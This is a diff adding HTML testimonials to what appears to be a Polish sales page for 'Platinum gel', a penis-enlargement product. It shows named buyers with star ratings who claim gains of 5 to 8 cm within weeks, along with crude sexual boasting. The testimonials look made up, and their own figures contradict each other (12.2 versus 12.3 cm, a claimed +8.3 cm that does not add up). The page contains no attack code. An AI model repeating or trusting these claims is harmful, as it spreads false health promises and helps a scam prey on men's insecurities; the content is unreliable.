+							<p>Bartek, l. 31, Olsztynek</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user3.jpg" alt="user3" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Czy mając 10 cm członka można być szczęśliwym???</h2>
+						</div>
+						<div class="article-text">
+							<p>Jasne, że nie. Byłem załamany. Wstydziłem się kobiet i bałem się, że zostanę wyśmiany na starcie. Ten żel powiększający penisa znalazłem na forum dla kulturystów. Sprawdziłem je, bo przecież i tak nie miałem nic do stracenia. Efekt: 7,1 cm więcej. Wszystkie dziewczyny robią się mokre na widok mojej maczugi. A ja robię z niej dobry użytek.</p>
+						</div>
+						<div class="article-text">
+							<p>+7,1 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"> </i></p>
+						</div>
+						<div class="article-text">
+							<p>Piotrek, l. 29, Bielsko-Biała</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user4.jpg" alt="user4" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Żona wreszcie sama się do mnie dobiera</h2>
+						</div>
+						<div class="article-text">
+							<p>Moje życie seksualne nie należało do udanych. Dobrze wiedziałem, w czym tkwi problem. Mając tak małego członka, nie mogłem dać żonie orgazmu. W końcu, znudzona i sfrustrowana, straciła ochotę na seks ze mną. Wybrałem żel zamiast pompek i innych dziwnych „narzędzi tortur” dla penisa, więc nie zauważyła, że zacząłem kurację. Dzięki Platinum gel powiększyłem penisa o 6,4 cm i wydłużyłem czas stosunku. Teraz zaspokajam ją 3 razy pod rząd, słuchając jak krzyczy z rozkoszy.</p>
+						</div>
+						<div class="article-text">
+							<p>+6,4 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ </i><i class="gray-star">★</i></p>
+						</div>
+						<div class="article-text">
+							<p>Przemek, l. 42, Suwałki</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user5.jpg" alt="user5" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Ale to szybko działa!</h2>
+						</div>
+						<div class="article-text">
+							<p>Może nie miałem problemu z bardzo małym penisem, bo Pan Bóg obdarował mnie 18,2 cm członkiem. Ale czemu miałbym zadowolić się taką długością? Byłem w szoku, że penis mi tak szybko urósł. 23,4 cm to prawdziwe monstrum. Gdybym chciał, mógłbym grać w pornolach. Ledwie mieści się w spodniach, ale kobiety go uwielbiają.</p>
+						</div>
+						<div class="article-text">
+							<p>+5,2 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"></i></p>
+						</div>
+						<div class="article-text">
+							<p>Bartek, l. 39, Toruń</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user6.jpg" alt="user6" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Spektakularne efekty</h2>
+						</div>
+						<div class="article-text">
+							<p>Lubię pilnować czy naprawdę dostaję to, za co zapłaciłem. Dlatego codziennie dokumentowałem efekty swojej kuracji. Pierwszego dnia powiększyłem penisa o 1,4 cm. Po tygodniu miałem już 2,1 cm więcej, a po 14 dniach cieszyłem się z dodatkowych 4,3 cm. W sumie: 6,6 cm więcej w 30 dni. Mogę to skomentować tylko w jeden sposób: WOW!</p>
+						</div>
+						<div class="article-text">
+							<p>+6,6 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"></i></p>
+						</div>
+						<div class="article-text">
+							<p>Tomasz, l. 45, Poznań</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user7.jpg" alt="user7" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Koniec z kompleksami!</h2>
+						</div>
+						<div class="article-text">
+							<p>Już od czasów szkoły średniej koledzy śmiali się na basenie z mojego małego ptaszka. Przez kompleksy moje podrywy kończyły totalną porażką. Byłem spięty i przestraszony, że zostanę odrzucony z powodu 12,2 cm siusiaka. Platinum gel to nie tylko kuracja na szybkie powiększenie penisa, ale sposób, by raz na zawsze pokonać męskie kompleksy. Kiedyś 12,3 cm miałem we wzwodzie. Teraz w spoczynku jest 13,1 cm!</p>
+						</div>
+						<div class="article-text">
+							<p>+8,3 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"></i></p>
+						</div>
+						<div class="article-text">
+							<p>Gaweł, l. 32, Żagań</p>
+						</div>
+					</div>
+					<div class="frame-r-col center-text">
+						<a href="#order">
+						<img src="img/user8.jpg" alt="user8" />
+						</a>
+						<div class="middle-topic red-text">
+							<h2>Nie ma lepszej metody na WIELKIEGO penisa</h2>
+						</div>
+						<div class="article-text">
+							<p>Jeszcze kilka tygodni temu zaczynałem czuć się ze sobą naprawdę źle. Platinum gel podsunął mi zaufany kolega. 4 tygodnie wystarczyły, bym odzyskał pewność siebie w łóżku. Moja pała jest tak wielka, że kobiety ledwie mogą utrzymać ją w ustach, a ja zawsze mam chęć i siłę na więcej. 19,3 cm penis na nie działa!</p>
+						</div>
+						<div class="article-text">
+							<p>+6,2 cm</p>
+						</div>
+						<div class="article-text">
+							<p><i class="yellow-star">★ ★ ★ ★ ★</i><i class="gray-star"></i></p>
+						</div>
+						<div class="article-text">
+							<p>Maciej, l. 48, Gorzów Wielkopolski</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+		<script src="js/jquery.js"></script>
+		<script src="js/drewlex_main.js"></script>
+		<script src="js/main.js"></script>
+		<script src="/tl-validator.js?country=pl&label=false"></script>
+	</body>
 </html>
